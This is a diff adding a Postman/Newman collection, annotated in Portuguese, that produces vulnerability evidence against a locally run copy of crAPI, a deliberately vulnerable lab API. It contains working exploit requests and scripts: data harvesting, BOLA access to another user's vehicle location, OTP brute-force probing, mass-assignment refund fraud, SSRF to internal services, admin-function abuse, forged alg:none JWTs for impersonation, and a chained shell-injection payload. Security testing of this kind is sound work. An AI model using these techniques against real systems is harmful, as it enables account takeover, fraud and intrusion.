@@ -1,0 +1,893 @@
+{
+  "info": {
+    "name": "crAPI - Evidencias (Newman)",
+    "description": "Colecao auto-suficiente para rodar via Newman e gerar o relatorio HTML de evidencias. Cada secao prepara seus proprios dados; cada assercao explica o que a resposta prova. Requer o crAPI local no ar.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "exec": [
+          "var base = pm.collectionVariables.get('base_url');",
+          "if (!pm.collectionVariables.get('token_atacante')) {",
+          "  pm.sendRequest({",
+          "    url: base + '/identity/api/auth/login', method: 'POST',",
+          "    header: {'Content-Type': 'application/json'},",
+          "    body: {mode: 'raw', raw: JSON.stringify({email: pm.collectionVariables.get('email_atacante'), password: pm.collectionVariables.get('senha_atacante')})}",
+          "  }, function (err, res) {",
+          "    if (!err) { try { pm.collectionVariables.set('token_atacante', res.json().token); } catch (e) {} }",
+          "  });",
+          "}"
+        ]
+      }
+    }
+  ],
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://localhost:8888"
+    },
+    {
+      "key": "email_atacante",
+      "value": "atacante@teste.local"
+    },
+    {
+      "key": "senha_atacante",
+      "value": "Atacante@2026!"
+    },
+    {
+      "key": "token_atacante",
+      "value": ""
+    },
+    {
+      "key": "leaked_vehicleid",
+      "value": ""
+    },
+    {
+      "key": "leaked_email",
+      "value": ""
+    },
+    {
+      "key": "order_id",
+      "value": ""
+    },
+    {
+      "key": "video_id",
+      "value": ""
+    },
+    {
+      "key": "forged_jwt",
+      "value": ""
+    }
+  ],
+  "item": [
+    {
+      "name": "03 - Excessive Data Exposure",
+      "item": [
+        {
+          "name": "GET posts da comunidade (vaza email e vehicleid)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/community/api/v2/community/posts/recent",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "community",
+                "api",
+                "v2",
+                "community",
+                "posts",
+                "recent"
+              ]
+            },
+            "description": "API3. O JSON expoe email e vehicleid de cada autor. Guardados para os ataques seguintes."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "var a = j.posts[0].author;",
+                  "pm.collectionVariables.set('leaked_vehicleid', a.vehicleid);",
+                  "pm.collectionVariables.set('leaked_email', a.email);",
+                  "pm.test('HTTP 200', function(){ pm.response.to.have.status(200); });",
+                  "pm.test('resposta vaza email e vehicleid de outros usuarios (nao aparecem na UI)', function(){",
+                  "  pm.expect(a.email).to.be.a('string'); pm.expect(a.vehicleid).to.be.a('string');",
+                  "});"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "01 - BOLA (localizacao de veiculo de outro usuario)",
+      "item": [
+        {
+          "name": "GET localizacao do veiculo vazado (token do atacante)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/vehicle/{{leaked_vehicleid}}/location",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "vehicle",
+                "{{leaked_vehicleid}}",
+                "location"
+              ]
+            },
+            "description": "API1. Usa o vehicleid vazado no passo anterior; a API nao verifica se o veiculo e do atacante."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - acessou veiculo que nao e do atacante', function(){ pm.response.to.have.status(200); });",
+                  "var j = pm.response.json();",
+                  "pm.test('resposta traz localizacao de outro usuario', function(){ pm.expect(j.vehicleLocation).to.exist; });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "02 - Broken Authentication (OTP sem rate limit)",
+      "item": [
+        {
+          "name": "1) forget-password (dispara OTP para outro usuario)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/forget-password",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "forget-password"
+              ]
+            },
+            "description": "API2. Inicia o reset de senha de um usuario cujo email foi vazado.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{leaked_email}}\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - OTP enviado', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "2.1) check-otp com OTP errado (sem rate limit)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/v3/check-otp",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "v3",
+                "check-otp"
+              ]
+            },
+            "description": "Tentativa de OTP invalido. O endpoint nao aplica rate limit nem bloqueio -> brute-force viavel (OTP de 4 digitos).",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{leaked_email}}\",\n  \"otp\": \"0001\",\n  \"password\": \"X\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('tentativa aceita sem bloqueio (sem 429)', function(){ pm.expect(pm.response.code).to.not.equal(429); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "2.2) check-otp com OTP errado (sem rate limit)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/v3/check-otp",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "v3",
+                "check-otp"
+              ]
+            },
+            "description": "Tentativa de OTP invalido. O endpoint nao aplica rate limit nem bloqueio -> brute-force viavel (OTP de 4 digitos).",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{leaked_email}}\",\n  \"otp\": \"0002\",\n  \"password\": \"X\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('tentativa aceita sem bloqueio (sem 429)', function(){ pm.expect(pm.response.code).to.not.equal(429); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "2.3) check-otp com OTP errado (sem rate limit)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/auth/v3/check-otp",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "auth",
+                "v3",
+                "check-otp"
+              ]
+            },
+            "description": "Tentativa de OTP invalido. O endpoint nao aplica rate limit nem bloqueio -> brute-force viavel (OTP de 4 digitos).",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"{{leaked_email}}\",\n  \"otp\": \"0003\",\n  \"password\": \"X\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('tentativa aceita sem bloqueio (sem 429)', function(){ pm.expect(pm.response.code).to.not.equal(429); });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "04 - Mass Assignment (reembolso sem devolucao)",
+      "item": [
+        {
+          "name": "1) comprar produto (define order_id)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/workshop/api/shop/orders",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "shop",
+                "orders"
+              ]
+            },
+            "description": "Cria um pedido para o atacante. Guarda o order_id.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"product_id\": 1,\n  \"quantity\": 1\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "pm.collectionVariables.set('order_id', j.id);",
+                  "pm.test('compra efetuada', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "2) editar pedido injetando status=returned",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/workshop/api/shop/orders/{{order_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "shop",
+                "orders",
+                "{{order_id}}"
+              ]
+            },
+            "description": "API3. O campo interno 'status' e gravavel pelo cliente: reembolsa sem devolucao real.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"status\": \"returned\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - status alterado pelo cliente', function(){ pm.response.to.have.status(200); });",
+                  "var j = pm.response.json();",
+                  "pm.test('pedido marcado como returned (reembolso indevido)', function(){ pm.expect(JSON.stringify(j)).to.include('returned'); });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "05 - SSRF (contact_mechanic -> servico interno)",
+      "item": [
+        {
+          "name": "POST contact_mechanic apontando para MailHog interno",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/workshop/api/merchant/contact_mechanic",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "merchant",
+                "contact_mechanic"
+              ]
+            },
+            "description": "API7. O servidor faz a requisicao a uma URL arbitraria (servico interno inacessivel ao atacante) e reflete a resposta.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"mechanic_code\": \"TRAC_JHN\",\n  \"problem_details\": \"x\",\n  \"mechanic_api\": \"http://mailhog:8025/api/v2/messages\",\n  \"vin\": \"0JATXVG6ESXV0HX6R\",\n  \"number_of_repeats\": 1\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200', function(){ pm.response.to.have.status(200); });",
+                  "var j = pm.response.json();",
+                  "pm.test('servidor buscou o servico interno e refletiu o conteudo', function(){ pm.expect(j.response_from_mechanic_api).to.exist; });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "06 - BFLA (funcao de admin por usuario comum)",
+      "item": [
+        {
+          "name": "1) upload de video (define video_id)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/videos",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "videos"
+              ]
+            },
+            "description": "Cria um video para ter um video_id.",
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "amostra.mp4"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "pm.collectionVariables.set('video_id', j.id);",
+                  "pm.test('upload ok', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "2) DELETE via endpoint de ADMIN (token de usuario comum)",
+          "request": {
+            "method": "DELETE",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/admin/videos/{{video_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "admin",
+                "videos",
+                "{{video_id}}"
+              ]
+            },
+            "description": "API5. O endpoint administrativo nao verifica papel: um ROLE_USER executa a funcao."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - funcao de admin executada por usuario comum', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "07 - JWT Forgery (assinatura nao verificada)",
+      "item": [
+        {
+          "name": "Forjar ADMIN (alg:none, role=admin)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{forged_jwt}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/dashboard",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "dashboard"
+              ]
+            },
+            "description": "API2. Token alg:none sem assinatura, role=admin. O servidor nao verifica a assinatura."
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "function b64url(str){var w=CryptoJS.enc.Utf8.parse(str);return CryptoJS.enc.Base64.stringify(w).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');}",
+                  "var header = {alg:'none', typ:'JWT'};",
+                  "var payload = {sub:'atacante@teste.local', role:'admin', iat:1700000000, exp:1999999999};",
+                  "pm.collectionVariables.set('forged_jwt', b64url(JSON.stringify(header))+'.'+b64url(JSON.stringify(payload))+'.');"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - token forjado (alg:none) aceito', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Personificar outro usuario (alg:none, sub=adam007)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{forged_jwt}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/dashboard",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "dashboard"
+              ]
+            },
+            "description": "API2. Mesmo truque com o sub de outro usuario: retorna o dashboard da vitima."
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "function b64url(str){var w=CryptoJS.enc.Utf8.parse(str);return CryptoJS.enc.Base64.stringify(w).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');}",
+                  "var header = {alg:'none', typ:'JWT'};",
+                  "var payload = {sub:'adam007@example.com', role:'user', iat:1700000000, exp:1999999999};",
+                  "pm.collectionVariables.set('forged_jwt', b64url(JSON.stringify(header))+'.'+b64url(JSON.stringify(payload))+'.');"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - token forjado (alg:none) aceito', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "JWKS exposto (chave publica)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/.well-known/jwks.json",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                ".well-known",
+                "jwks.json"
+              ]
+            },
+            "description": "A chave publica fica exposta; nem necessaria, pois a assinatura nao e verificada."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - JWKS exposto', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "08 - Shell Injection (Mass Assignment + SSRF)",
+      "item": [
+        {
+          "name": "1) upload de video (define video_id)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/videos",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "videos"
+              ]
+            },
+            "description": "Cria um video proprio para o chain (independente do folder BFLA, que deleta o seu).",
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "amostra.mp4"
+                }
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "var j = pm.response.json();",
+                  "pm.collectionVariables.set('video_id', j.id);",
+                  "pm.test('upload ok', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "2) Mass Assignment em conversion_params",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/videos/{{video_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "videos",
+                "{{video_id}}"
+              ]
+            },
+            "description": "Grava um comando injetado na propriedade interna conversion_params.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"conversion_params\": \"-i /dev/null; echo PWNED\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - propriedade interna gravada pelo cliente', function(){ pm.response.to.have.status(200); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "3) convert_video pelo gateway publico (bloqueado)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/identity/api/v2/user/videos/convert_video?video_id={{video_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "identity",
+                "api",
+                "v2",
+                "user",
+                "videos",
+                "convert_video"
+              ],
+              "query": [
+                {
+                  "key": "video_id",
+                  "value": "{{video_id}}"
+                }
+              ]
+            },
+            "description": "A chamada direta e bloqueada: o endpoint so aceita acesso interno."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 403 - endpoint so interno', function(){ pm.response.to.have.status(403); });"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "4) SSRF -> convert_video INTERNO (dispara o chain)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_atacante}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/workshop/api/merchant/contact_mechanic",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "workshop",
+                "api",
+                "merchant",
+                "contact_mechanic"
+              ]
+            },
+            "description": "Usa a SSRF para chamar o convert_video interno. A resposta (base64) confirma o chain.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"mechanic_code\": \"TRAC_JHN\",\n  \"problem_details\": \"x\",\n  \"mechanic_api\": \"http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id={{video_id}}\",\n  \"vin\": \"0JATXVG6ESXV0HX6R\",\n  \"number_of_repeats\": 1\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('HTTP 200 - sink de shell injection alcancado via chain', function(){ pm.response.to.have.status(200); });",
+                  "var j = pm.response.json();",
+                  "pm.test('crAPI confirma o chain na resposta', function(){ pm.expect(j.response_from_mechanic_api).to.exist; });"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
